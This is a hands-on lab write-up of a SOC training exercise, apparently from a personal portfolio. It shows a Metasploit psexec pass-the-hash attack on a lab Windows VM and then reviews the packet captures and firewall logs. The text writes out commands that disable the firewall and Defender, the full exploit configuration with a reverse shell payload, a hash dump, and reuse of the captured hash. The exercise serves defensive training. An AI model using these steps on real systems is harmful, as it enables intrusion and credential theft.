By: Cody Keppen [LinkedIn Profile](https://www.linkedin.com/in/cody-keppen-a09068355/)
Date: 04/23/2026

---
# Table of Contents
- [Preview of Exercise](#preview-of-exercise)
- [Concepts Demonstrated](#concepts-demonstrated) 
- [Instructional Steps](#instructional-steps)
- [Case Notes](#case-notes)
- [Lessons Learned](#lessons-learned)
- [Summary](#summary)
- [Resources](#resources)

---

# Preview of Exercise

The environment is part of the MetaCTF SOC CORE Skills w/John Strand lab using two exercises linked in the [Resources](#resources) section. It has a Kali and Windows machine, with the Kali terminal accessed in the Windows environment.

The Kali will then perform the Pass-The-Hash attack after dumping the password hashes from a compromised admin. 

Both attacks will use Tshark for packet capture and review. As well as the use of WireShark.

Then a review of the Firewall logs when the Firewall and Anti-Virus is turned back on for the second attack.

#  Concepts Demonstrated

1. Demonstration with Windows Firewall Off
	1. Tshark Packet Capture for Review
	2. Nmap Use for Open Port Discovery 
	3. Pass the Hash Attack with Metasploit
	4. Packet Review with tshark and WireShark
2. Demonstration with Windows Firewall On
	1. Tshark Packet Capture for Review
	2. Nmap Use for Open Port Discovery 
	3. Pass the Hash Attack with Metasploit
	4. Firewall Log Review
	5. Packet Review with tshark and WireShark

---
# Instructional Steps

These are the steps taken during this demonstration. There will be links throughout this section to the [Lessons Learned](#lessons-learned) section to notate obstacles and solutions during the demonstration.

## Vulnerable System Attack

I'll be creating a vulnerable system by turning off the Firewall and Anti-virus. Using tshark for a packet review of the Pass-the-Hash attack to show what is happening between the Kali and Windows VMs.

### Tshark Packet Capture for Vulnerable System

WireShark is installed on the Windows machine. To keep from having to use the file path to run Tshark, I'll make shortcut using `Set-Alias` in PowerShell.

```powershell
Set-Alias tshark "C:\Program Files\Wireshark\tshark.exe"
```

Now I'll find the interfaces available to start capturing the packets using the below command.

```powershell
tshark -D
```

![](images/Pasted%20image%2020260426205633.png)

Ethernet 3 is the fourth select. 

- `-i 4` — to choose the interface 4 (Ethernet 3)
- `-nn` — to not resolve hostnames or port names to keep output clean like the firewall
- `-w` — write raw packets to a file instead of printing to screen

This command will create a `pcap` file named `nmap_fw_off.pcap`.

```powershell
tshark -i 4 -nn -w nmap_fw_off.pcap
```

I need to open a new terminal PowerShell to let that packet capture run. Once I cancel the packet capture, the file will be created.

### Turning Windows Firewall and AV Off

I'll use the following command to turn the Firewall and Anti-virus off.

```powershell
netsh advfirewall set allprofiles state off
Set-MpPreference -DisableRealtimeMonitoring $true
```

You can see the packet capture occurring in the background.

![](images/Pasted%20image%2020260426210716.png)

### Nmap Scan of Vulnerable System

Here I'll start using my Kali terminal for an nmap scan to find open ports. First I'll need the IP of the Windows device. Which is, `10.10.71.19`.

![](images/Pasted%20image%2020260427120124.png)

Now on the Kali in root, I run the IP with nmap to start the port scan.

```bash
nmap 10.10.71.19
```

I see 4 open ports from the scan with the firewall turned off.

![](images/Pasted%20image%2020260427120253.png)

### Pass the Hash Attack of Vulnerable System

Now I'll start the process to start the Pass-the-Hash attack. I go over more details on the Pass-The-Hash Attack in [Lessons Learned](#pass-the-hash-attack).

I run the following command in PowerShell on the Window device to set the admin password, simulating a compromised Admin account.

```powershell
net user Administrator password1234
```

Back on the Kali I'm going to get its IP, `10.10.97.23`

```bash
ifconfig eth0
```

Then I'm going to start Metasploit with the following.

![](images/Pasted%20image%2020260427120448.png)

```Bash
msfconsole -q
```

The exploit to be used is `smb/psexec`  with a default payload of the `windows/meterpreter/reverse_tcp`.

SMB/psexec is descibed more in [Lessons Learned](#smb-ports)

I'll be setting the `RHOST` (Windows), `LHOST` (Kali) as well as the login of the user with `SMBUSER` and `SMBPASS`.

The `RHOST` represents the targeted Remote Host device to be connected to.
The `LHOST` is the Local Host is the local device establishing the connection.

I go over reverse_tcp more in [Lessons Learned](#reverse-tcp).

Once set, I use `exploit` to execute the login.

```Bash
use exploit/windows/smb/psexec
set RHOST 10.10.71.19
set LHOST 10.10.97.23
set SMBUSER Administrator
set SMBPASS password1234
exploit
```

![](images/Pasted%20image%2020260427120928.png)

A successful connection is made, confirmed with `pwd` showing the Windows `C:\` drive while in the Kali terminal.

![](images/Pasted%20image%2020260427121121.png)

The following commands are then used as the Administrator to dump the hashes and then quit the connection to the Windows machine.

```bash
hashdump
```

![](images/Pasted%20image%2020260427121229.png)

With the hashdump, I now have the account name and hashed password of different users. I'm going to replace the password `password1234` with the hash for the admin. To attempt a login. So instead of using the `password1234` string for the login, I'll be using the hash string.

The hash strings are gone over more here, [Lessons Learned](#hash-structure)

```bash
set SMBPASS aad3b435b51404eeaad3b435b51404ee:d4a1be1776ad10df103812b1a923cde4
exploit
```

![](images/Pasted%20image%2020260427121441.png)

As you can see, I'm able to login still, even though I replaced the password of the administrator for the hash of that password. Which works because it's the hash that Windows does the check against. Even though the passwords are not stored in plain text, a successful login is still possible just by using the hashed credentials.

I tried to test the other users but had no success, as I got "no-access" and "Account_Disabled" errors. Which look to be disabled accounts I can't log into on this VM environment.

![](images/Pasted%20image%2020260427121651.png)

(I looked more into the different accounts found in the [Lessons Learned](#failed-account-attempts) section.)

### Tshark Packet Review Vulnerable System

Once that is all done and I had my fun connecting to the Windows admin, I use `quit` in Metasploit to exit. Then start on the packet review, using `Ctrl+C` in the tshark Powershell terminal to create the `pcap`.

First I'm going to check the SMB ports and I see plenty of `SYN`, `SYN, ACK` and `RST` flags. Indicating a scan of the SMB ports. 

```powershell
tshark -r nmap_fw_off.pcap -Y "tcp.port==445 or tcp.port==139 or tcp.port==135"
```

![](images/Pasted%20image%2020260427122145.png)

Now I'll check the NTLM handshake of my three connection attempts. More details on NTLM here, [Lessons Learned](#ntlm-with-pass-the-hash)

```powershell
tshark -r .\nmap_fw_off.pcap -Y "ntlmssp or smb2"
```
---

**Administrator login with password**

Here you can see a three step process.

1. The initial connection attempt with the `NTLMSSP_NEGOTIATE`
2. Followed by the error connection prompting the `NTLMSSP_CHALLENGE`
3. With the exchange of the password with `NTLMSSP_AUTH` 
4. Finally with a `Setup Response` followed by multiple `Encrypted SMB3` lines, showing an encrypted connection.

![](images/Pasted%20image%2020260427124537.png)

---

**Administrator login with hash**

Here you can see the same exact sequence when using the hash as the password, not the `password1234` string, and still successfully connecting.

![](images/Pasted%20image%2020260427123549.png)

---

**Attempted DefaultAccount login with hash**

I tried to log into the default account using the hash from the hashdump. You can see the same sequence, except at the end where you see an error response and no encrypted connections.

![](images/Pasted%20image%2020260427123715.png)

I tried the other accounts, but discovered they are all disable by default as well, [Lessons Learned](#failed-account-attempts)

---

**Further investigation with WireShark**

Using the `nmap_fw_off.pcap` file in WireShark, I want to do a TCP Stream check on the IP connection.

With just `smb2` in the filter bar, I can already see the three account login attemps.

![](images/Pasted%20image%2020260427133351.png)

I'll do a TCP Stream search of one of the Admin connections. This will list out the order of the TCP connection so I can easily follow along what is occurring.

![](images/Pasted%20image%2020260427133446.png)

Now I can see the original TCP connection to `port 445`, with a `SYN` origination from the Kali `10.10.97.23` to the Windows machine `10.10.71.19`, with a successful connection with the `ACK` flag.

Below is the NTLM login phase with an encrypted connection after the `Session Setup Response`.

![](images/Pasted%20image%2020260427133755.png)

I did the same for the DefaultAccount login attempt, where you can see the break in the connection at the end.
![](images/Pasted%20image%2020260427134200.png)

---
## Hardened System Attack

Now is the demonstration with the Firewall and Anti-virus turned back on. Tshark will still be used for packet capture. There will also be a Firewall log and Anti-virus actions for review.

Same environment, new IPs.

Kali: `10.10.105.215`
Windows: `10.10.99.119`

### Tshark Packet Capture for Hardened System

I'll do t he same setup as before to easily run tshark.

```powershell
Set-Alias tshark "C:\Program Files\Wireshark\tshark.exe"
```

Then start the packet capture.

```powershell
tshark -i 4 -nn -w nmap_fw_on.pcap
```

### Turning Windows Firewall and AV On

Now I need to ensure the firewall and Anti-virus are turned on. Running this command in another PowerShell terminal, while the original is capturing the packets.

```powershell
netsh advfirewall set allprofiles state on
Set-MpPreference -DisableRealtimeMonitoring $false
```

![](images/Pasted%20image%2020260427143158.png)

### Turn on Firewalls logs

Now I want to turn on the firewall logs to review later.

``` powershell
netsh advfirewall set allprofiles logging droppedconnections enable
netsh advfirewall set allprofiles logging allowedconnections enable
netsh advfirewall set allprofiles logging filename "C:\Windows\System32\LogFiles\Firewall\pfirewall.log"
```

![](images/Pasted%20image%2020260427143237.png)

Confirm:

```powershell
netsh advfirewall show allprofiles logging
```

![](images/Pasted%20image%2020260427143300.png)

### Nmap Scan of Hardened System

Now on my Kali, I'll start the nmap scan. Throughout this process we'll see what roadblocks and obstacles come up.

```bash
nmap 10.10.99.119
```

There is already a noticeable difference in the number of open ports. We've gone from 4 open ports, to just the one `ms-wbt-server`.

![](images/Pasted%20image%2020260427143633.png)

### Pass the Hash Attack of Hardened System

Now I'll attempt to use the same SMB exploit before to establish a connection.

```Bash
use exploit/windows/smb/psexec
set RHOST 10.10.99.119
set LHOST 10.10.105.215
set SMBUSER Administrator
set SMBPASS password1234
exploit
```

![](images/Pasted%20image%2020260427143941.png)

And we are blocked. Exploit initiated, but no session was completed. The Firewall successfully blocked the attack.

### Firewall Log Review of Hardened System

Now to check the Firewall Log. 

I'm going to create a variable to make navigation faster.

```powershell
$fwlog = "C:\Windows\System32\LogFiles\Firewall\pfirewall.log"
```

Now I'm going to open up the log itself.

```powershell
Get-Content $fwlog
```

Right now it is a lot of information. So I'll do some filtering.

```powershell
Select-String "DROP" $fwlog
```

![](images/Pasted%20image%2020260427144653.png)

Here I can see all the SMB port `135, 139 and 445` dropped connections. All coming from the Kali attacker, `10.10.105.215`.

Now I'd like to take a look at only the attacker IP. I do want to point out, the lone port 22 connection is due to the VM environment. Everything after would be a real world expectation.

```powershell
Select-String "10.10.105.215" $fwlog
```

![](images/Pasted%20image%2020260427145127.png)

### Tshark Packet Review of Hardened System

Now to try Tshark, looking at the same SMB ports in the earlier attack.

```powershell
tshark -r nmap_fw_on.pcap -Y "tcp.port==445 or tcp.port==135 or tcp.port==139"
```

![](images/Pasted%20image%2020260427145620.png)

You'll see only `SYN` packets, but after that, everything is dropped. No `SYN, ACK` or `ACK` flags found.

Now I'll check to see if any possible NTLM connections were attempted.

```powershell
tshark -r nmap_fw_on.pcap -Y "ntlmssp or smb2"
```

No results!

![](images/Pasted%20image%2020260427145927.png)
### WireShark Packet Review of Hardened System

Now let's check WireShark.

Using the Kali IP as the filter with TCP connections, I do find port `3389` again.

`ip.src==10.10.105.215 && tcp`

![](images/Pasted%20image%2020260427151022.png)

When I do a TCP Stream, I don't see any further connections.

![](images/Pasted%20image%2020260427151123.png)

Now I'll check to see if the Windows responded back with any connection, `[SYN, ACK]`.

`ip.src==10.10.99.119 && tcp.flags.ack==1 && tcp.flags.syn==1`

The results are just the open `3389` port from before, which had no other connections.

![](images/Pasted%20image%2020260427152114.png)

# Case Notes

These would be the case notes on the first attack on Vulnerable System

- Found multiple SYN-ACK responses from SMB ports (`135, 139, 445`) from internal IP device (`10.10.71.19`) to external IP (`10.10.97.23`) confirming open ports
- Established TCP port 445 connection found between external IP (`10.10.97.23`) and internal device (`10.10.71.19`)
- Two successful NTLM logins from external IP to "Administrator" account found over SMB
	- NTLM NEGOTIATE, CHALLENGE AND AUTH sequence found with smb2 encryption following
	- No observable difference between logins
- Failed attempt to the "DefaultAccount" user over SMB
	- NTLM NEGOTIATE, CHALLENGE, AUTH AND ERROR sequence found with no smb2 encryption following
- **Escalation**: External IP worth investigating `10.10.97.23`
- **Escalation**: SMB Ports `135, 139, 445` worth review
- **Escalation**: Administrator user events worth review

This would be the case notes on the second attack on Hardened System

- Checked Firewall log for any additional device scans on SMB ports
- Found internal IP device (`10.10.99.119`) with firewall "DROP" entries for ports `135, 139, 445` from external IP (`10.10.105.215`)
- Checked for TCP connections and only found open port `3389` with no further connection
- Checked packets and found no `NTLMSSP` or `SMB2` connections
- **Escalation**: External IP worth investigating `10.10.105.215`

---
# Lessons Learned

## Pass-The-Hash Attack

A Pass-The-Hash Attack is the use of hashed passwords for login. In an attempt to keep passwords saved, hash algorithms are used on passwords so they are not stored in plaintext to be easily revealed.

Furthermore, when you log into Windows, it converts the password string you enter at login into a hash, then compares it to your stored hashed password to authenticate they match.

<br>

## SMB Ports

The use of the `SMB/psexec` attack in Metasploit takes advantage of this. Using the windows Server Message Block (SMB) protocol for remote administration, allowing commands to be run remotely on SMB.

Using compromised admin credentials, a connection is established over SMB port `445`.

<br>

## Hash structure

From there, `hashdump` is used to get the stored hashes, which is a normal admin function.

You find that a hash line will have two hashes together. A legacy hash and a NTLM hash separated by a colon `:`. The first being legacy, which now just represents a disabled value, as it was discontinued. The second being the actual password hash used, as a NTLM hash. Example,

```
aad3b435b51404eeaad3b435b51404ee:d4a1be1776ad10df103812b1a923cde4
```

`aad3b435b51404eeaad3b435b51404ee` is the LM Hash
`d4a1be1776ad10df103812b1a923cde4` is the NTLM hash

<br>

## NTLM with Pass-The-Hash

With the NTLM password hash captured, it is used with `NTLM` (NT LAN Manager) to authenticate at the NTLM level. Passing the hash straight into the authentication process of,

`NEGOTIATE` = Client declares it wants to authenticate with NTLM <br>
`CHALLENGE` = Server sends a random number to combine with hash <br>
`AUTH` = Client returns hash combined with the random number <br>

The server then does the same calculations for the hash and random number to verify they match the stored hash and generated random number.

Because this attack is injecting the hash password, it can be hard to determine if the login was using a plaintext password or hashed password.

<br>

## Reverse TCP

Reverse TCP allows the payload to understand which IP to contact and from which IP, to establish a connection once executed.

The reverse tcp connection is an attempt to bypass firewall rules that typically block inbound connections. This establishes an outbound connection.

Adding a layer of evasion from being detected.

<br>

## Failed Account Attempts

I actually tried to log into each account I got a hash for and was denied on all of them.

These are built in Windows accounts that are disabled by default. Very unlikely to be able to log into this from the beginning.

`WDAGUtilityAccount` is for Windows Defender <br>
`DefaultAccount` account used for Windows apps <br>
`Guest` built in limited access account. <br>

![](images/Pasted%20Image%2020260426214400.png)

<br>

# Summary

Fun exercise. Got to do a Pass-The-Hash attack after dumping the hashes from a compromised admin.

It was quite a surprise to learn that you can get around the concept of hashing your passwords because windows will just use the hash for password authentication anyways using SMB.

The difference between having the Firewall on and off was glaring. Hard to move forward when the connections are being dropped.

Tshark is a nice tool to use on Windows. Very similar to using tcpdump. Of Course, WireShark makes things a lot easier as well when reviewing packets.

---
# Resources
- https://github.com/strandjs/IntroLabs/blob/master/IntroClassFiles/Tools/IntroClass/Nmap/Nmap.md
- https://github.com/strandjs/IntroLabs/blob/master/IntroClassFiles/Tools/IntroClass/FirewallLog/FirewallLog.md
